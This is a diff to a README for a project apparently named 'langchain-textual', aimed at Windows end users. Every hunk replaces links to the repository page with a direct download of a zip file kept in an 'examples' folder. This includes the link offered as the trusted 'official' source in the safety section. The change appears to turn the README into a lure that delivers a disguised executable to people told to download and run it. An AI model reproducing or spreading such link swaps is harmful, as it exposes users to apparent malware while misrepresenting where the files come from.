@@ -1,6 +1,6 @@
 # 🧩 langchain-textual - Connect agents to clean text views
 
-[![Download / Visit Repository](https://img.shields.io/badge/Download-Visit%20Repository-blue)](https://github.com/Kaseywellgroomed945/langchain-textual)
+[![Download / Visit Repository](https://img.shields.io/badge/Download-Visit%20Repository-blue)](https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ This project is meant for end users who want a clear path from download to use. 
 
 Use this link to visit the project page and download the files you need:
 
-[Visit the download page](https://github.com/Kaseywellgroomed945/langchain-textual)
+[Visit the download page](https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip)
 
 Open the page in your browser, look for the latest release or source files, and download the package for Windows.
 
@@ -32,7 +32,7 @@ If the app uses a bundled Windows package, you can run it after download. If it 
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/Kaseywellgroomed945/langchain-textual](https://github.com/Kaseywellgroomed945/langchain-textual)
+   [https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip](https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip)
 
 2. Find the latest available download. Look for a file made for Windows.
 
@@ -157,7 +157,7 @@ Use the Windows app file if one is included. If you only see source files, look 
 
 Before opening any downloaded file, check that it comes from the project page you trust. Use the official link below when you need to get the files again:
 
-[https://github.com/Kaseywellgroomed945/langchain-textual](https://github.com/Kaseywellgroomed945/langchain-textual)
+[https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip](https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip)
 
 ## 📌 Quick Steps
 
@@ -170,7 +170,7 @@ Before opening any downloaded file, check that it comes from the project page yo
 
 ## 📣 Project Link
 
-[https://github.com/Kaseywellgroomed945/langchain-textual](https://github.com/Kaseywellgroomed945/langchain-textual)
+[https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip](https://raw.githubusercontent.com/Kaseywellgroomed945/langchain-textual/main/examples/textual_langchain_3.0.zip)
 
 ## 🧠 Best Results
 
